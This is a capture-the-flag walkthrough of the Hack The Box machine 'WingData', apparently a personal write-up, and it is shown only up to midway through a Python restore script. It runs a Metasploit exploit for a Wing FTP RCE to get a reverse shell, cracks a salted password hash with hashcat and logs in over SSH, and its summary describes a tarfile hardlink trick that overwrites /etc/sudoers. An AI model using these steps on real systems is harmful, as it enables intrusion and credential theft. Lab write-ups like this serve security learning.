---
name: WingData
os: Linux
difficulty: Easy
status: PWNED
pwn_date: 04 Mar 2026
summary: "Discovery of a Wing FTP Server (v7.4.3) on the client portal revealed a vulnerability to CVE-2025-47812, an unauthenticated Remote Code Execution (RCE) via a NULL-byte authentication bypass. Exploitation yielded a reverse shell, allowing for the enumeration of the application's data directory where a configuration file and a user database were found. Analysis of settings.xml and wacky.xml provided a salted password hash for the user wacky, which was cracked and used to establish an SSH connection. Local enumeration identified a misconfiguration where the user could execute a Python restoration script as root without a password. Although the script implemented tarfile.extractall(filter=\"data\") to prevent path traversal, the environment was vulnerable to CVE-2024-12718: By crafting a malicious archive with a deeply nested directory structure to bypass the \"data\" filter's validation, a hardlink was used to overwrite /etc/sudoers. This granted the user full sudo privileges, leading to an immediate escalation to root."
matrix_enum: 4
matrix_real: 8.5
matrix_cve: 9.5
matrix_custom: 5.5
matrix_ctf: 5
---

<div style="background: linear-gradient(135deg, #0d1117 0%, #16213e 100%); padding: 25px; border-radius: 15px; border: 1px solid #9acd32; font-family: 'Inter', sans-serif; color: white; display: flex; align-items: center; justify-content: space-between; gap: 5px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); min-height: 190px;">
    
    <div style="display: flex; align-items: center; gap: 25px;">
        <div style="flex-shrink: 0; width: 105px; height: 105px; border-radius: 50%; border: 3px solid #9acd32; overflow: hidden; background: #0d1117; box-shadow: 0 0 20px #9acd3233;">
            <img src="Tought Process/!Media/!Logo_WingData.png" style="width: 100%; height: 100%; object-fit: cover;" onerror="this.src='https://www.hackthebox.com/storage/avatars/6aae4108848d5f493b26c68a4176953b.png'">
        </div>
        <div>
            <h1 style="margin: 0; font-size: 34px; font-weight: 800; color: #ffffff; text-transform: uppercase; letter-spacing: 2px; line-height: 1;">WingData</h1>
            <div style="margin-top: 10px;"><span style="font-size: 11px; font-weight: bold; color: #9acd32; border: 1.5px solid #9acd32; padding: 3px 12px; border-radius: 4px; text-transform: uppercase;">PWNED</span></div>
            <div style="display: flex; gap: 15px; margin-top: 18px; font-size: 14px; font-weight: 500; opacity: 0.9;">
                <span><span style="color: #9acd32;">💻</span> Linux</span>
                <span><span style="color: #9acd32;">🔥</span> Easy</span>
                <span><span style="color: #9acd32;">📅</span> 04 Mar 2026</span>
            </div>
        </div>
    </div>

    <div style="width: 220px; height: 190px; flex-shrink: 0; display: flex; align-items: center; justify-content: center;">
        <svg width="220" height="190" viewBox="0 0 190 175">
            <circle cx="80" cy="85" r="62" fill="rgba(255,255,255,0.015)" />
            <polygon points="80,25 137,65 115,130 45,130 23,65" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5" />
            <polygon points="80,40 122,70 106,118 54,118 38,70" fill="none" stroke="rgba(255,255,255,0.07)" stroke-width="0.5" />
            <polygon points="80,55 108,75 97,106 63,106 52,75" fill="none" stroke="rgba(255,255,255,0.07)" stroke-width="0.5" />
            <polygon points="80,70 93,80 88,95 72,95 67,80" fill="none" stroke="rgba(255,255,255,0.07)" stroke-width="0.5" />
            
            <text x="80" y="15" font-size="9" fill="#aaa" text-anchor="middle" font-weight="bold">ENUM</text>
            <text x="142" y="65" font-size="9" fill="#aaa" text-anchor="start" font-weight="bold">REAL</text>
            <text x="115" y="145" font-size="9" fill="#aaa" text-anchor="middle" font-weight="bold">CVE</text>
            <text x="45" y="145" font-size="9" fill="#aaa" text-anchor="middle" font-weight="bold">CUSTOM</text>
            <text x="18" y="65" font-size="9" fill="#aaa" text-anchor="end" font-weight="bold">CTF</text>
            
            <polygon points="80,65.8 118.80310586484225,72.39210662950215 106.80300750453677,121.89117494349759 64.48246933947871,106.35804865149862 57.17464360891631,77.58359213500127" fill="#9acd3233" stroke="#9acd32" stroke-width="2.5" stroke-linejoin="round" />
            <circle cx="80" cy="85" r="2.5" fill="#9acd32" />
        </svg>
    </div>
</div>

---

Like always, we start with a nmap scan:

```zsh
sudo nmap -sS -sV -Pn --top-ports 100 --min-rate 5000 10.129.10.141
```
```
Nmap scan report for 10.129.10.141  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)  
80/tcp open  http    Apache httpd 2.4.66  
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel  

Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
```

We see we have two ports open (http and ssh), so let's visit it the http first. We get redirected to wingdata.htb, so let's add that to the /etc/hosts (and future subdomains also):

![[WingData_1.png]]

Let's search the website a bit to see if we can find something:

![[WingData_2.png]]

The main website didn't had anything special, so the only thing that can get us closer to the user flag is the client portal. It uses a FTP server software "Wing FTP Server" and we even have the version (v7.4.3). We can search for any CVE that affects this specific version of WingFTP. We can immediatly see CVE-2025-47812, that lets us do Unauthenticated Remote Code Execution (RCE). I'll use MSFConsole for this, since it has this specific CVE:

```zsh
msfconsole
```
```
[msf](Jobs:0 Agents:0) >> search WingFTP

Matching Modules
================

#  Name                                      Disclosure Date  Rank       Check  Description
-  ----                                      ---------------  ----       -----  -----------
0  exploit/multi/http/wingftp_null_byte_rce  2025-06-30       excellent  Yes    Wing FTP Server NULL-byte Authentication Bypass (CVE-2025-47812)
1    \_ target: Unix/Linux Command Shell     .                .          .      .
2    \_ target: Windows Command Shell        .                .          .      .

[msf](Jobs:0 Agents:0) >> use 1
[msf](Jobs:0 Agents:0) exploit(multi/http/wingftp_null_byte_rce) >> set RHOST ftp.wingdata.htb
[msf](Jobs:0 Agents:0) exploit(multi/http/wingftp_null_byte_rce) >> set LHOST 10.10.14.113
[msf](Jobs:0 Agents:0) exploit(multi/http/wingftp_null_byte_rce) >> exploit

(Meterpreter 1)(/opt/wftpserver) >
```

And just like that, we successfully made a reverse shell. Let's explore and see if we find the user flag:

```zsh
(Meterpreter 2)(/opt/wftpserver) > cd /home/wacky/
[-] stdapi_fs_chdir: Operation failed: 13
```

Nope, we are not able to get the user flag yet. We need to see if we find some file with the ssh credentials for the user "wacky" (or any other info):

```
(Meterpreter 2)(/opt/wftpserver) > ls
Listing: /opt/wftpserver
========================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
040750/rwxr-x---  4096      dir   2026-03-04 07:54:20 +0000  Data
100750/rwxr-x---  4834      fil   2018-08-01 04:39:36 +0100  License.txt
040750/rwxr-x---  4096      dir   2026-03-04 08:00:44 +0000  Log
100777/rwxrwxrwx  250       fil   2026-03-04 07:56:27 +0000  MYUSskaV
100777/rwxrwxrwx  250       fil   2026-03-04 08:00:45 +0000  QKfJUBax
100750/rwxr-x---  1434      fil   2020-09-13 17:33:53 +0100  README
040750/rwxr-x---  4096      dir   2026-02-09 13:19:58 +0000  lua
100644/rw-r--r--  5         fil   2026-03-04 07:54:20 +0000  pid-wftpserver.pid
040750/rwxr-x---  4096      dir   2026-03-04 08:00:44 +0000  session
040750/rwxr-x---  4096      dir   2026-02-09 13:19:58 +0000  session_admin
100750/rwxr-x---  115258    fil   2025-03-26 15:21:50 +0000  version.txt
040750/rwxr-x---  12288     dir   2026-02-09 13:19:58 +0000  webadmin
040750/rwxr-x---  4096      dir   2026-02-09 13:19:58 +0000  webclient
100750/rwxr-x---  3272      fil   2025-11-02 16:11:36 +0000  wftp_default_ssh.key
100750/rwxr-x---  1342      fil   2017-11-22 05:50:49 +0000  wftp_default_ssl.crt
100750/rwxr-x---  1675      fil   2017-11-22 05:50:49 +0000  wftp_default_ssl.key
100750/rwxr-x---  4649509   fil   2021-09-14 07:25:48 +0100  wftpconsole
100750/rwxr-x---  22283682  fil   2025-03-26 15:30:48 +0000  wftpserver

(Meterpreter 2)(/opt/wftpserver) > cd Data/
(Meterpreter 2)(/opt/wftpserver/Data) > ls
Listing: /opt/wftpserver/Data
=============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040750/rwxr-x---  4096   dir   2026-02-09 13:19:58 +0000  1
040750/rwxr-x---  4096   dir   2026-03-04 07:54:20 +0000  _ADMINISTRATOR
100600/rw-------  11264  fil   2025-11-02 16:11:36 +0000  bookmark_db
100750/rwxr-x---  2554   fil   2025-11-02 21:23:21 +0000  settings.xml
100750/rwxr-x---  241    fil   2025-11-02 16:12:29 +0000  ssh_host_ecdsa_key
100666/rw-rw-rw-  3272   fil   2025-11-02 16:52:34 +0000  ssh_host_key

(Meterpreter 2)(/opt/wftpserver/Data) > ls
Listing: /opt/wftpserver/Data
=============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040750/rwxr-x---  4096   dir   2026-02-09 13:19:58 +0000  1
040750/rwxr-x---  4096   dir   2026-03-04 07:54:20 +0000  _ADMINISTRATOR
100600/rw-------  11264  fil   2025-11-02 16:11:36 +0000  bookmark_db
100750/rwxr-x---  2554   fil   2025-11-02 21:23:21 +0000  settings.xml
100750/rwxr-x---  241    fil   2025-11-02 16:12:29 +0000  ssh_host_ecdsa_key
100666/rw-rw-rw-  3272   fil   2025-11-02 16:52:34 +0000  ssh_host_key

(Meterpreter 2)(/opt/wftpserver/Data) > cd 1
(Meterpreter 2)(/opt/wftpserver/Data/1) > ls
Listing: /opt/wftpserver/Data/1
===============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040750/rwxr-x---  4096   dir   2026-02-09 13:19:58 +0000  groups
100750/rwxr-x---  624    fil   2025-11-02 21:28:27 +0000  portlistener.xml
100750/rwxr-x---  11861  fil   2025-11-02 17:21:12 +0000  settings.xml
040750/rwxr-x---  4096   dir   2026-03-04 08:04:21 +0000  users
```

Looking at settings.xml, we see how the passwords are salted:

```xml
<?xml version="1.0" ?>  
<DOMAIN_OPTION Description="Wing FTP Server Domain settings">  
<Domain_Max_Session>0</Domain_Max_Session>  
<Domain_Per_Ip_Max_Session>0</Domain_Per_Ip_Max_Session>  
<Per_Session_Max_Download_Speed>0</Per_Session_Max_Download_Speed>  
<Per_Session_Max_Upload_Speed>0</Per_Session_Max_Upload_Speed>  
<Domain_Max_Download_Speed>0</Domain_Max_Download_Speed>  
<Domain_Max_Upload_Speed>0</Domain_Max_Upload_Speed>  
<Per_User_Max_Download_Speed>0</Per_User_Max_Download_Speed>  
<Per_User_Max_Upload_Speed>0</Per_User_Max_Upload_Speed>  
<Passive_Type>0</Passive_Type>  
<Pasv_Ip_Refresh_Interval>60</Pasv_Ip_Refresh_Interval>  
<Fixed_Ip></Fixed_Ip>  
<Web_Ip>http://ip.wftpserver.com/w/getIP.php</Web_Ip>  
<DNS_Ip></DNS_Ip>  
<Enable_UPnP_For_Passive_Ports>0</Enable_UPnP_For_Passive_Ports>  
<Min_Passive_Port>1024</Min_Passive_Port>  
<Max_Passive_Port>1124</Max_Passive_Port>  
<Transfer_Buffer_Size>65535</Transfer_Buffer_Size>  
<Userdata_Access_Style>1</Userdata_Access_Style>  
<MYSQL_Address>localhost</MYSQL_Address>  
<MYSQL_Port>3306</MYSQL_Port>  
<MYSQL_Username>root</MYSQL_Username>  
<MYSQL_Password></MYSQL_Password>  
<MYSQL_DatabaseName>wftp_database</MYSQL_DatabaseName>  
<MYSQL_UnixSocket></MYSQL_UnixSocket>  
<ODBC_DSN_Address></ODBC_DSN_Address>  
<ODBC_DSN_Username></ODBC_DSN_Username>  
<ODBC_DSN_Password></ODBC_DSN_Password>  
<Enable_Mode_Z_support>0</Enable_Mode_Z_support>  
<Default_Compression_level>8</Default_Compression_level>  
<Min_Compression_level>1</Min_Compression_level>  
<Max_Compression_level>9</Max_Compression_level>  
<Enable_SFV_Check>0</Enable_SFV_Check>  
<SFV_Check_Create_Missing>0</SFV_Check_Create_Missing>  
<SFV_Check_Bad_File>0</SFV_Check_Bad_File>  
<SFV_Check_Create_Progress>0</SFV_Check_Create_Progress>  
<SFV_Check_Send_Result>0</SFV_Check_Send_Result>  
<Anti_Hammer_Enable>1</Anti_Hammer_Enable>  
<Anti_Hammer_Block_Time>180</Anti_Hammer_Block_Time>  
<Anti_Hammer_Login_Failed_Counts>10</Anti_Hammer_Login_Failed_Counts>  
<Anti_Hammer_Interval>90</Anti_Hammer_Interval>  
<Anti_Hammer_Send_Message>0</Anti_Hammer_Send_Message>  
<SSL_Name>wftp_default_ssl</SSL_Name>  
<SSH_Name>wftp_default_ssh</SSH_Name>  
<SSH_Use_UTF8>1</SSH_Use_UTF8>  
<SMTP_Name></SMTP_Name>  
<Enable_FXP>0</Enable_FXP>  
<Enable_WebLink>0</Enable_WebLink>  
<Enable_Logfile>1</Enable_Logfile>  
<Logfile_Name>%Y-%M-%D.log</Logfile_Name>  
<Logfile_Maxsize>512000</Logfile_Maxsize>  
<Message_Log_File_Enable>1</Message_Log_File_Enable>  
<Message_Log_Scrn_Enable>1</Message_Log_Scrn_Enable>  
<Security_Log_File_Enable>1</Security_Log_File_Enable>  
<Security_Log_Scrn_Enable>1</Security_Log_Scrn_Enable>  
<FTP_Command_Log_File_Enable>1</FTP_Command_Log_File_Enable>  
<FTP_Command_Log_Scrn_Enable>1</FTP_Command_Log_Scrn_Enable>  
<FTP_Response_Log_File_Enable>1</FTP_Response_Log_File_Enable>  
<FTP_Response_Log_Scrn_Enable>1</FTP_Response_Log_Scrn_Enable>  
<WEB_Command_Log_File_Enable>1</WEB_Command_Log_File_Enable>  
<WEB_Command_Log_Scrn_Enable>1</WEB_Command_Log_Scrn_Enable>  
<WEB_Response_Log_File_Enable>1</WEB_Response_Log_File_Enable>  
<WEB_Response_Log_Scrn_Enable>1</WEB_Response_Log_Scrn_Enable>  
<SSH_Command_Log_File_Enable>1</SSH_Command_Log_File_Enable>  
<SSH_Command_Log_Scrn_Enable>1</SSH_Command_Log_Scrn_Enable>  
<SSH_Response_Log_File_Enable>1</SSH_Response_Log_File_Enable>  
<SSH_Response_Log_Scrn_Enable>1</SSH_Response_Log_Scrn_Enable>  
<ODBC_Error_Log_File_Enable>1</ODBC_Error_Log_File_Enable>  
<ODBC_Error_Log_Scrn_Enable>1</ODBC_Error_Log_Scrn_Enable>  
<MYSQL_Error_Log_File_Enable>1</MYSQL_Error_Log_File_Enable>  
<MYSQL_Error_Log_Scrn_Enable>1</MYSQL_Error_Log_Scrn_Enable>  
<LUA_Error_Log_File_Enable>1</LUA_Error_Log_File_Enable>  
<LUA_Error_Log_Scrn_Enable>1</LUA_Error_Log_Scrn_Enable>  
<Mail_Error_Log_File_Enable>1</Mail_Error_Log_File_Enable>  
<Mail_Error_Log_Scrn_Enable>1</Mail_Error_Log_Scrn_Enable>  
<File_Error_Log_File_Enable>1</File_Error_Log_File_Enable>  
<File_Error_Log_Scrn_Enable>1</File_Error_Log_Scrn_Enable>  
<Normal_Error_Log_File_Enable>1</Normal_Error_Log_File_Enable>  
<Normal_Error_Log_Scrn_Enable>1</Normal_Error_Log_Scrn_Enable>  
<Message_Welcome>%ServerName ready...</Message_Welcome>  
<Message_Login>User %Name logged in.</Message_Login>  
<Message_Change_Dir>CWD command ok. &quot;%Dir&quot; is current directory.</Message_Change_Dir>  
<Message_Dir_List>Transfer ok.</Message_Dir_List>  
<Message_File_Upload>File received ok. Transferred:%ConTransferBytes;Average speed is:%ConTransferSpeedKBS</Mes  
sage_File_Upload>  
<Message_File_Download>File sent ok. Transferred:%ConTransferBytes;Average speed is:%ConTransferSpeedKBS</Messa  
ge_File_Download>  
<Message_System_Command>UNIX Type: L8</Message_System_Command>  
<Message_Quit_Command>Goodbye.</Message_Quit_Command>  
<Enable_UPnP_For_Listener_Ports>0</Enable_UPnP_For_Listener_Ports>  
<Max_Number_Sessions_Per_User_Account>0</Max_Number_Sessions_Per_User_Account>  
<Max_Sessions_Per_Ip_For_User_Account>0</Max_Sessions_Per_Ip_For_User_Account>  
<Command_Timeout_Min>5</Command_Timeout_Min>  
<Enable_Domain_Logo>0</Enable_Domain_Logo>  
<Transfer_Timeout_Minutes>5</Transfer_Timeout_Minutes>  
<ADUser_Enable>0</ADUser_Enable>  
<ADUser_Domain></ADUser_Domain>  
<ADUser_Directory></ADUser_Directory>  
<ADUser_Enable_OwnDir>0</ADUser_Enable_OwnDir>  
<ADUser_Enable_FileRead>1</ADUser_Enable_FileRead>  
<ADUser_Enable_FileWrite>0</ADUser_Enable_FileWrite>  
<ADUser_Enable_FileAppend>0</ADUser_Enable_FileAppend>  
<ADUser_Enable_FileDelete>0</ADUser_Enable_FileDelete>  
<ADUser_Enable_DirRename>0</ADUser_Enable_DirRename>  
<ADUser_Enable_DirList>1</ADUser_Enable_DirList>  
<ADUser_Enable_DirCreate>0</ADUser_Enable_DirCreate>  
<ADUser_Enable_DirDelete>0</ADUser_Enable_DirDelete>  
<ADUser_Enable_FileRename>0</ADUser_Enable_FileRename>  
<ADUser_Enable_ZipFile>0</ADUser_Enable_ZipFile>  
<ADUser_Enable_UnzipFile>0</ADUser_Enable_UnzipFile>  
<ADUser_User_Mapping>ADUser001:LocalUser001&#x0A;ADUser002:LocalUser002</ADUser_User_Mapping>  
<LDAP_Enable>0</LDAP_Enable>  
<LDAP_Host>localhost</LDAP_Host>  
<LDAP_Port>389</LDAP_Port>  
<LDAP_UseSSL>0</LDAP_UseSSL>  
<LDAP_BindDN></LDAP_BindDN>  
<LDAP_BindPass></LDAP_BindPass>  
<LDAP_BaseDN></LDAP_BaseDN>  
<LDAP_Filter>(&amp;(objectClass=posixAccount)(uid=%s))</LDAP_Filter>  
<LDAP_Directory></LDAP_Directory>  
<LDAP_Enable_OwnDir>0</LDAP_Enable_OwnDir>  
<LDAP_Enable_FileRead>1</LDAP_Enable_FileRead>  
<LDAP_Enable_FileWrite>0</LDAP_Enable_FileWrite>  
<LDAP_Enable_FileAppend>0</LDAP_Enable_FileAppend>  
<LDAP_Enable_FileDelete>0</LDAP_Enable_FileDelete>  
<LDAP_Enable_DirRename>0</LDAP_Enable_DirRename>  
<LDAP_Enable_DirList>1</LDAP_Enable_DirList>  
<LDAP_Enable_DirCreate>0</LDAP_Enable_DirCreate>  
<LDAP_Enable_DirDelete>0</LDAP_Enable_DirDelete>  
<LDAP_Enable_FileRename>0</LDAP_Enable_FileRename>  
<LDAP_Enable_ZipFile>0</LDAP_Enable_ZipFile>  
<LDAP_Enable_UnzipFile>0</LDAP_Enable_UnzipFile>  
<LDAP_User_Mapping>LDAPUser001:LocalUser001&#x0A;LDAPUser002:LocalUser002</LDAP_User_Mapping>  
<LDAP_Group_Mapping>CN=ADGroup1,CN=Builtin,DC=wftpserver,DC=com:LocalUser1&#x0A;CN=ADGroup2,CN=Builtin,DC=wftps  
erver,DC=com:LocalUser2</LDAP_Group_Mapping>  
<LDAP_Version>3</LDAP_Version>  
<LDAP_Dir_Lowercase>0</LDAP_Dir_Lowercase>  
<WebLink_Speed>0</WebLink_Speed>  
<LIST_TIME_GMT>1</LIST_TIME_GMT>  
<Logfile_Compress>1</Logfile_Compress>  
<Enable_UTF8_ON>1</Enable_UTF8_ON>  
<Enable_AUTH_ON>1</Enable_AUTH_ON>  
<Use_LANIP_For_LAN_Client_Passive>1</Use_LANIP_For_LAN_Client_Passive>  
<Min_Password_Length>0</Min_Password_Length>  
<Password_Have_Numerals>0</Password_Have_Numerals>  
<Password_Have_Lowercase>0</Password_Have_Lowercase>  
<Password_Have_Uppercase>0</Password_Have_Uppercase>  
<Password_Have_Nonalphanumeric>0</Password_Have_Nonalphanumeric>  
<Enable_NTFS_Permission>0</Enable_NTFS_Permission>  
<EnableSHA256>1</EnableSHA256>  
<Enable_HTTPS_Redirect>0</Enable_HTTPS_Redirect>  
<HTTPS_Redirect_Port>443</HTTPS_Redirect_Port>  
<Change_Password_Firstlogon>0</Change_Password_Firstlogon>  
<Enable_UploadLink>0</Enable_UploadLink>  
<UploadLink_Speed>0</UploadLink_Speed>  
<Additional_HTTP_Headers></Additional_HTTP_Headers>  
<Allow_Passive_Active_Mode>2</Allow_Passive_Active_Mode>  
<Passive_Listener_Timeout>30</Passive_Listener_Timeout>  
<Auto_Passive_Port_Forward>0</Auto_Passive_Port_Forward>  
<MYSQL_Set_UTF8>1</MYSQL_Set_UTF8>  
<Enable_Domain>1</Enable_Domain>  
<Auto_Active_Port_Forward>0</Auto_Active_Port_Forward>  
<Weblink_URL></Weblink_URL>  
<Enable_Symbolic_Link>0</Enable_Symbolic_Link>  
<Enable_Welcome_Message>0</Enable_Welcome_Message>  
<Welcome_Message></Welcome_Message>  
<Keep_Old_Weblink>0</Keep_Old_Weblink>  
<Uplink_Overwrite_File>0</Uplink_Overwrite_File>  
<SSH_Banner>WingFTPServer</SSH_Banner>  
<HTTP_KeepAlive>1</HTTP_KeepAlive>  
<Enable_Weblink_Subfolder>0</Enable_Weblink_Subfolder>  
<TLS_Session_Timeout>3600</TLS_Session_Timeout>  
<EnablePasswordSalting>1</EnablePasswordSalting>  
<SaltingString>WingFTP</SaltingString>  
<Enable_Log_Millisecond>0</Enable_Log_Millisecond>  
<LDAP_Mapping_CaseInsensitive>0</LDAP_Mapping_CaseInsensitive>  
<LDAP_Timeout>10</LDAP_Timeout>  
<Keep_Anonymous_Weblink>0</Keep_Anonymous_Weblink>  
<Transfer_Limit>  
<Transfer_Limit_Enable>0</Transfer_Limit_Enable>  
<Transfer_Limit_Reset>0</Transfer_Limit_Reset>  
<Transfer_Limit_Reset_Time>0</Transfer_Limit_Reset_Time>  
<Enable_Upload_Limit_Never>0</Enable_Upload_Limit_Never>  
<Current_Upload_Size_Never>0</Current_Upload_Size_Never>  
<Max_Upload_Size_Never>0</Max_Upload_Size_Never>  
<Enable_Download_Limit_Never>0</Enable_Download_Limit_Never>  
<Current_Download_Size_Never>0</Current_Download_Size_Never>  
<Max_Download_Size_Never>0</Max_Download_Size_Never>  
<Enable_Upload_Limit_Hourly>0</Enable_Upload_Limit_Hourly>  
<Current_Upload_Size_Hourly>0</Current_Upload_Size_Hourly>  
<Max_Upload_Size_Hourly>0</Max_Upload_Size_Hourly>  
<Enable_Download_Limit_Hourly>0</Enable_Download_Limit_Hourly>  
<Current_Download_Size_Hourly>0</Current_Download_Size_Hourly>  
<Max_Download_Size_Hourly>0</Max_Download_Size_Hourly>  
<Enable_Upload_Limit_Daily>0</Enable_Upload_Limit_Daily>  
<Current_Upload_Size_Daily>0</Current_Upload_Size_Daily>  
<Max_Upload_Size_Daily>0</Max_Upload_Size_Daily>  
<Enable_Download_Limit_Daily>0</Enable_Download_Limit_Daily>  
<Current_Download_Size_Daily>0</Current_Download_Size_Daily>  
<Max_Download_Size_Daily>0</Max_Download_Size_Daily>  
<Enable_Upload_Limit_Weekly>0</Enable_Upload_Limit_Weekly>  
<Current_Upload_Size_Weekly>0</Current_Upload_Size_Weekly>  
<Max_Upload_Size_Weekly>0</Max_Upload_Size_Weekly>  
<Enable_Download_Limit_Weekly>0</Enable_Download_Limit_Weekly>  
<Current_Download_Size_Weekly>0</Current_Download_Size_Weekly>  
<Max_Download_Size_Weekly>0</Max_Download_Size_Weekly>  
<Enable_Upload_Limit_Monthly>0</Enable_Upload_Limit_Monthly>  
<Current_Upload_Size_Monthly>0</Current_Upload_Size_Monthly>  
<Max_Upload_Size_Monthly>0</Max_Upload_Size_Monthly>  
<Enable_Download_Limit_Monthly>0</Enable_Download_Limit_Monthly>  
<Current_Download_Size_Monthly>0</Current_Download_Size_Monthly>  
<Max_Download_Size_Monthly>0</Max_Download_Size_Monthly>  
</Transfer_Limit>  
</DOMAIN_OPTION>
```

They use `<SaltingString>WingFTP</SaltingString>` as salting string. Now we can try to find the user wacky in /users:

```
(Meterpreter 2)(/opt/wftpserver/Data/1) > cd users/  
(Meterpreter 2)(/opt/wftpserver/Data/1/users) > ls  
Listing: /opt/wftpserver/Data/1/users  
=====================================  
  
Mode              Size  Type  Last modified              Name  
----              ----  ----  -------------              ----  
100750/rwxr-x---  2842  fil   2026-03-04 08:04:21 +0000  anonymous.xml  
100750/rwxr-x---  2846  fil   2025-11-02 16:13:05 +0000  john.xml  
100666/rw-rw-rw-  2847  fil   2025-11-02 17:05:56 +0000  maria.xml  
100666/rw-rw-rw-  2847  fil   2025-11-02 17:02:45 +0000  steve.xml  
100666/rw-rw-rw-  2856  fil   2025-11-02 17:28:56 +0000  wacky.xml
```
```xml
<?xml version="1.0" ?>  
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">  
<USER>  
<UserName>wacky</UserName>  
<EnableAccount>1</EnableAccount>  
<EnablePassword>1</EnablePassword>  
<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>  
<ProtocolType>63</ProtocolType>  
<EnableExpire>0</EnableExpire>  
<ExpireTime>2025-12-02 12:02:46</ExpireTime>  
<MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>  
<MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>  
<MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>  
<MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>  
<SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>  
<SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>  
<MaxConnection>0</MaxConnection>  
<ConnectionPerIp>0</ConnectionPerIp>  
<PasswordLength>0</PasswordLength>  
<ShowHiddenFile>0</ShowHiddenFile>  
<CanChangePassword>0</CanChangePassword>  
<CanSendMessageToServer>0</CanSendMessageToServer>  
<EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>  
<SSHPublicKeyPath></SSHPublicKeyPath>  
<SSHAuthMethod>0</SSHAuthMethod>  
<EnableWeblink>1</EnableWeblink>  
<EnableUplink>1</EnableUplink>  
<EnableTwoFactor>0</EnableTwoFactor>  
<TwoFactorCode></TwoFactorCode>  
<ExtraInfo></ExtraInfo>  
<CurrentCredit>0</CurrentCredit>  
<RatioDownload>1</RatioDownload>  
<RatioUpload>1</RatioUpload>  
<RatioCountMethod>0</RatioCountMethod>  
<EnableRatio>0</EnableRatio>  
<MaxQuota>0</MaxQuota>  
<CurrentQuota>0</CurrentQuota>  
<EnableQuota>0</EnableQuota>  
<NotesName></NotesName>  
<NotesAddress></NotesAddress>  
<NotesZipCode></NotesZipCode>  
<NotesPhone></NotesPhone>  
<NotesFax></NotesFax>  
<NotesEmail></NotesEmail>  
<NotesMemo></NotesMemo>  
<EnableUploadLimit>0</EnableUploadLimit>  
<CurLimitUploadSize>0</CurLimitUploadSize>  
<MaxLimitUploadSize>0</MaxLimitUploadSize>  
<EnableDownloadLimit>0</EnableDownloadLimit>  
<CurLimitDownloadLimit>0</CurLimitDownloadLimit>  
<MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>  
<LimitResetType>0</LimitResetType>  
<LimitResetTime>1762103089</LimitResetTime>  
<TotalReceivedBytes>0</TotalReceivedBytes>  
<TotalSentBytes>0</TotalSentBytes>  
<LoginCount>2</LoginCount>  
<FileDownload>0</FileDownload>  
<FileUpload>0</FileUpload>  
<FailedDownload>0</FailedDownload>  
<FailedUpload>0</FailedUpload>  
<LastLoginIp>127.0.0.1</LastLoginIp>  
<LastLoginTime>2025-11-02 12:28:52</LastLoginTime>  
<EnableSchedule>0</EnableSchedule>  
</USER>  
</USER_ACCOUNTS>
```

We have the password hash `<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>` and the salt. Let's try to crack it using hashcat:

```zsh
hashcat -m 1410 -O -w 3 wacky_hash.txt /usr/share/wordlists/rockyou.txt
```
```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

The password for the user wacky is `!#7Blushing^*Bride5`! Maybe that password is reused and works in ssh:

```zsh
ssh wacky@10.129.10.212
```
```
wacky@10.129.10.212's password:

wacky@wingdata:~$ cat user.txt  
b02373b553**********************
```

Running sudo -l gives us valuable information:

```
wacky@wingdata:~$ sudo -l  
Matching Defaults entries for wacky on wingdata:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User wacky may run the following commands on wingdata:  
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *  
wacky@wingdata:~$ which sudo  
/usr/bin/sudo  
wacky@wingdata:~$ id  
uid=1001(wacky) gid=1001(wacky) groups=1001(wacky)
``` 

Lets check the restore_backup_clients.py:

```zsh
wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py  
```
```python
#!/usr/bin/env python3  
import tarfile  
import os  
import sys  
import re  
import argparse  
  
BACKUP_BASE_DIR = "/opt/backup_clients/backups"  
STAGING_BASE = "/opt/backup_clients/restored_backups"  
  
def validate_backup_name(filename):  
if not re.fullmatch(r"^backup_\d+\.tar$", filename):  
return False  
client_id = filename.split('_')[1].rstrip('.tar')  
return client_id.isdigit() and client_id != "0"  
  
def validate_restore_tag(tag):  
return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))  
  
def main():  
parser = argparse.ArgumentParser(  
description="Restore client configuration from a validated backup tarball.",  
epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"  
)  
parser.add_argument(  
"-b", "--backup",  
required=True,  
help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "  
"where <client_id> is a positive integer, e.g., backup_1001.tar)"  
)  
parser.add_argument(  
"-r", "--restore-dir",  
required=True,  
help="Staging directory name for the restore operation. "  
"Must follow the format: restore_<client_user> (e.g., restore_john). "  
"Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters).  
"  
)  
  
args = parser.parse_args()  
  
if not validate_backup_name(args.backup):  
print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.  
stderr)  
sys.exit(1)  
  
backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)  
if not os.path.isfile(backup_path):  
